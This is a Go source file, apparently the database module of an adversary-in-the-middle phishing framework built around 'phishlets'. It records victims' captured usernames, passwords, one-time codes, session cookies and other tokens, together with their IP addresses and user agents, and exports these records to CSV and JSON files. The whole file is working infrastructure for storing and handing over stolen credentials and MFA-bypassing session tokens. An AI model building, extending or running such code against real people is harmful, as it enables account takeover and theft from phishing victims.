package database

import (
	"encoding/csv"
	"encoding/json"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/tidwall/buntdb"
)

type Database struct {
	path string
	db   *buntdb.DB
}

func NewDatabase(path string) (*Database, error) {
	var err error
	d := &Database{
		path: path,
	}

	d.db, err = buntdb.Open(path)
	if err != nil {
		return nil, err
	}

	d.sessionsInit()

	d.db.Shrink()
	return d, nil
}

func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
	_, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
	return err
}

func (d *Database) ListSessions() ([]*Session, error) {
	s, err := d.sessionsList()
	return s, err
}

func (d *Database) SetSessionUsername(sid string, username string) error {
	err := d.sessionsUpdateUsername(sid, username)
	return err
}

func (d *Database) SetSessionPassword(sid string, password string) error {
	err := d.sessionsUpdatePassword(sid, password)
	return err
}

func (d *Database) SetSessionCustom(sid string, name string, value string) error {
	err := d.sessionsUpdateCustom(sid, name, value)
	return err
}

func (d *Database) SetSessionBodyTokens(sid string, tokens map[string]string) error {
	err := d.sessionsUpdateBodyTokens(sid, tokens)
	return err
}

func (d *Database) SetSessionHttpTokens(sid string, tokens map[string]string) error {
	err := d.sessionsUpdateHttpTokens(sid, tokens)
	return err
}

func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
	err := d.sessionsUpdateCookieTokens(sid, tokens)
	return err
}

func (d *Database) SetSessionOtpCodes(sid string, otpCodes []string, otpFieldName string) error {
	err := d.sessionsUpdateOtpCodes(sid, otpCodes, otpFieldName)
	return err
}

func (d *Database) SetSessionBaseDomain(sid string, baseDomain string) error {
	err := d.sessionsUpdateBaseDomain(sid, baseDomain)
	return err
}

func (d *Database) DeleteSession(sid string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(s.Id)
	return err
}

func (d *Database) DeleteSessionById(id int) error {
	_, err := d.sessionsGetById(id)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(id)
	return err
}

func (d *Database) Flush() {
	d.db.Shrink()
}

type SessionExportRecord struct {
	ID             int      `json:"id"`
	SessionID      string   `json:"session_id"`
	Phishlet       string   `json:"phishlet"`
	LandingURL     string   `json:"landing_url"`
	Username       string   `json:"username"`
	Password       string   `json:"password"`
	BaseDomain     string   `json:"base_domain"`
	UserAgent      string   `json:"user_agent"`
	RemoteAddr     string   `json:"remote_addr"`
	OtpCodes       []string `json:"otp_codes"`
	OtpFieldName   string   `json:"otp_field_name"`
	CreateTime     string   `json:"create_time"`
	UpdateTime     string   `json:"update_time"`
	HttpTokens     string   `json:"http_tokens"`
	CookieTokens   string   `json:"cookie_tokens"`
	BodyTokens     string   `json:"body_tokens"`
}

func (d *Database) formatUnixTime(ts int64) string {
	if ts == 0 {
		return ""
	}
	return time.Unix(ts, 0).UTC().Format(time.RFC3339)
}

func (d *Database) mapToJSONString(m interface{}) string {
	if m == nil {
		return ""
	}
	b, err := json.Marshal(m)
	if err != nil {
		return ""
	}
	return string(b)
}

func (d *Database) getExportRecords() ([]SessionExportRecord, error) {
	sessions, err := d.sessionsList()
	if err != nil {
		return nil, err
	}
	var records []SessionExportRecord
	for _, s := range sessions {
		rec := SessionExportRecord{
			ID:           s.Id,
			SessionID:    s.SessionId,
			Phishlet:     s.Phishlet,
			LandingURL:   s.LandingURL,
			Username:     s.Username,
			Password:     s.Password,
			BaseDomain:   s.BaseDomain,
			UserAgent:    s.UserAgent,
			RemoteAddr:   s.RemoteAddr,
			OtpCodes:     s.OtpCodes,
			OtpFieldName: s.OtpFieldName,
			CreateTime:   d.formatUnixTime(s.CreateTime),
			UpdateTime:   d.formatUnixTime(s.UpdateTime),
			HttpTokens:   d.mapToJSONString(s.HttpTokens),
			CookieTokens: d.mapToJSONString(s.CookieTokens),
			BodyTokens:   d.mapToJSONString(s.BodyTokens),
		}
		records = append(records, rec)
	}
	return records, nil
}

func (d *Database) normalizeCsvField(s string) string {
	var b strings.Builder
	b.Grow(len(s))
	for _, r := range s {
		switch {
		case r == 0x00:
			continue
		case r == '\r' || r == '\n' || r == '\t' || r == '\v' || r == '\f':
			b.WriteRune(' ')
		case r < 0x20:
			continue
		default:
			b.WriteRune(r)
		}
	}
	result := strings.TrimSpace(b.String())
	if len(result) > 0 {
		first := result[0]
		if first == '=' || first == '+' || first == '-' || first == '@' ||
			first == '\t' || first == '\r' || first == '%' || first == '|' {
			result = "'" + result
		}
	}
	return result
}

func (d *Database) ExportSessionsCSV(prefix string) (string, error) {
	records, err := d.getExportRecords()
	if err != nil {
		return "", err
	}
	timestamp := time.Now().Format("20060102_150405")
	filename := fmt.Sprintf("%ssessions_%s.csv", prefix, timestamp)

	f, err := os.Create(filename)
	if err != nil {
		return "", err
	}
	defer f.Close()

	if _, err := f.Write([]byte{0xEF, 0xBB, 0xBF}); err != nil {
		return "", err
	}

	w := csv.NewWriter(f)
	defer w.Flush()

	header := []string{"ID", "CreateTime", "UpdateTime", "SessionID", "BaseDomain", "Phishlet",
		"Username", "Password", "OtpCodes", "OtpField", "UserAgent", "RemoteAddr",
		"LandingURL", "HttpTokens", "CookieTokens", "BodyTokens"}
	if err := w.Write(header); err != nil {
		return "", err
	}

	for _, r := range records {
		row := []string{
			strconv.Itoa(r.ID),
			d.normalizeCsvField(r.CreateTime),
			d.normalizeCsvField(r.UpdateTime),
			d.normalizeCsvField(r.SessionID),
			d.normalizeCsvField(r.BaseDomain),
			d.normalizeCsvField(r.Phishlet),
			d.normalizeCsvField(r.Username),
			d.normalizeCsvField(r.Password),
			d.normalizeCsvField(strings.Join(r.OtpCodes, ";")),
			d.normalizeCsvField(r.OtpFieldName),
			d.normalizeCsvField(r.UserAgent),
			d.normalizeCsvField(r.RemoteAddr),
			d.normalizeCsvField(r.LandingURL),
			d.normalizeCsvField(r.HttpTokens),
			d.normalizeCsvField(r.CookieTokens),
			d.normalizeCsvField(r.BodyTokens),
		}
		if err := w.Write(row); err != nil {
			return "", err
		}
	}
	if err := w.Error(); err != nil {
		return "", err
	}
	return filename, nil
}

func (d *Database) ExportSessionsJSON(prefix string) (string, error) {
	records, err := d.getExportRecords()
	if err != nil {
		return "", err
	}
	timestamp := time.Now().Format("20060102_150405")
	filename := fmt.Sprintf("%ssessions_%s.json", prefix, timestamp)

	f, err := os.Create(filename)
	if err != nil {
		return "", err
	}
	defer f.Close()

	enc := json.NewEncoder(f)
	enc.SetIndent("", "  ")
	if err := enc.Encode(records); err != nil {
		return "", err
	}
	return filename, nil
}

func (d *Database) genIndex(table_name string, id int) string {
	return table_name + ":" + strconv.Itoa(id)
}

func (d *Database) getLastId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.View(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err != nil {
			return err
		}
		if id, err = strconv.Atoi(s_id); err != nil {
			return err
		}
		return nil
	})
	return id, err
}

func (d *Database) getNextId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.Update(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err == nil {
			if id, err = strconv.Atoi(s_id); err != nil {
				return err
			}
		}
		tx.Set(table_name+":0:id", strconv.Itoa(id+1), nil)
		return nil
	})
	return id, err
}

func (d *Database) getPivot(t interface{}) string {
	pivot, _ := json.Marshal(t)
	return string(pivot)
}
